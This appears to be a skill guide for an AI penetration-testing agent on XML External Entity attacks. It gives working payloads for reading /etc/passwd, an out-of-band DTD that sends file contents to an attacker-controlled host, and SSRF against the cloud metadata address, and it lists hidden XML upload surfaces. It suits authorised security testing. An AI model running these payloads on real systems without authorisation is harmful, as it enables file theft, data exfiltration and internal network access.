---
name: XXE / XML External Entity Attacks
description: Read arbitrary local files, exfiltrate data out-of-band, or pivot into SSRF through any endpoint that parses XML with an entity-resolving parser - file uploads that accept XML/XML-based formats (SOAP, SVG, DOCX/XLSX-style zipped-XML, RSS/Atom import, "import settings" features). Covers data exfiltration and SSRF-via-XXE specifically; for using a huge/exponential entity payload to exhaust memory instead, see the `resource-exhaustion` skill.
---

# XXE / XML External Entity Attacks

## The core idea
XML lets a document declare its own entities, and a `SYSTEM` or `PUBLIC` external entity can point at a local file path or a URL - if the parser resolves external entities (many do by default unless explicitly hardened) and the parsed content ends up anywhere in the response, you have a read primitive that costs you nothing but a crafted upload.

## In-band read (easiest to confirm)
If the parsed document's content - or some field derived from it - is reflected back in the response, a direct external entity pointing at a local file is the fastest test:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
Target files worth trying beyond the obvious: application config files, the web server's own source if the path is guessable, `.ssh` keys if the process's permissions allow it, and anything the `surface` tool's key-material scan would flag if you could read it (private keys, JWT signing material). On Windows targets, try `file:///C:/Windows/win.ini` as a cheap existence check before anything more targeted.

## Out-of-band exfiltration when nothing reflects
Most real targets don't echo the parsed value back. When that's the case, don't conclude XXE is unexploitable - use a two-stage attack via an external DTD you control, hosted on infrastructure you control (an `http` listener, or anywhere you can serve a static file and watch requests arrive):

Hosted DTD (`evil.dtd`), served from attacker-controlled infrastructure:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-HOST/?x=%file;'>">
%eval;
%exfil;
```
Payload sent to the target:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER-HOST/evil.dtd"> %xxe; ]>
<foo>&exfil;</foo>
```
The target fetches your DTD, resolves the local file into a parameter entity, then makes a second outbound request embedding the file's content in the URL - which you observe on your listener. This works even when the response body never contains anything derived from the XML, and it also confirms the parser performs *parameter*-entity expansion (some hardening disables general entities but misses parameter entities, or vice versa - test both independently if the first doesn't fire). Use `interactsh` as the attacker-controlled endpoint when you don't want to stand up your own listener, keeping in mind interactsh only gives you DNS/HTTP hit confirmation, not the exfiltrated content itself unless the content fits in a subdomain label - for real data exfiltration you need a listener you can read full request content from (`http`-tool-adjacent infrastructure, or a short-lived local server if the engagement scope allows outbound reachability to it).

Content without a convenient delimiter (newlines, length) can break the URL-embedding approach - a common refinement is reading the file through an FTP wrapper or chunking via `php://filter`-style wrappers when the backend is PHP, which isn't applicable to a generic engine, so adapt per detected stack. The core two-stage pattern (external DTD → parameter entity → second request carrying the data) is the transferable part.

## SSRF via XXE
An external entity's `SYSTEM` identifier doesn't have to be `file://` - it can be any URL the parser's resolver supports, which means the same primitive is also an SSRF primitive once file read doesn't apply or isn't the goal:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/" > ]>
<foo>&xxe;</foo>
```
If the response reflects the entity's resolved content, you get in-band SSRF results for free; if not, fall back to the OOB two-stage pattern above, or to `interactsh`/OOB confirmation the way the `ssrf` skill describes - the detection methodology is identical, just the delivery vector (an XML document instead of a `url` parameter) differs.

## Where XML parsing hides beyond an obvious "upload XML" button
- SOAP API endpoints
- SVG image uploads (SVG is XML) - avatar/logo upload features are a common overlooked vector
- Office document formats that are zipped XML internally (DOCX/XLSX/PPTX, ODF) - if a document-processing feature parses the inner XML, the same entity techniques can apply to a crafted document
- RSS/Atom feed import, "restore settings from export" features, any config-import that accepts XML
- SAML assertions (XML-based) - see the `auth-session-security` skill for the authentication-bypass angle; the parsing-level XXE risk is the same underlying bug class

## Confirming impact, minimally
A single file read (one line proving the target file's real content, e.g. the first line of `/etc/passwd` or a config value you can independently verify) or a single OOB callback is sufficient evidence - don't exfiltrate more than needed to prove the primitive works.

## Tools
- `http` to submit the crafted XML body directly, full control over headers/content-type, no shell-quoting friction with the `<`, `>`, `&`, `%` characters these payloads are full of
- `interactsh` for OOB confirmation (DNS/HTTP callback) when nothing reflects in-band
- `surface` to find file-upload and import endpoints that might accept an XML-based format, including ones not obviously labeled "XML"

## Reporting
State the parser/library if identifiable (error messages or stack traces often name it), whether the read was in-band or required the OOB two-stage technique, the exact file or URL targeted, and the specific proof obtained. Note whether general and/or parameter entity expansion was required - that detail determines which specific hardening flag was missing.
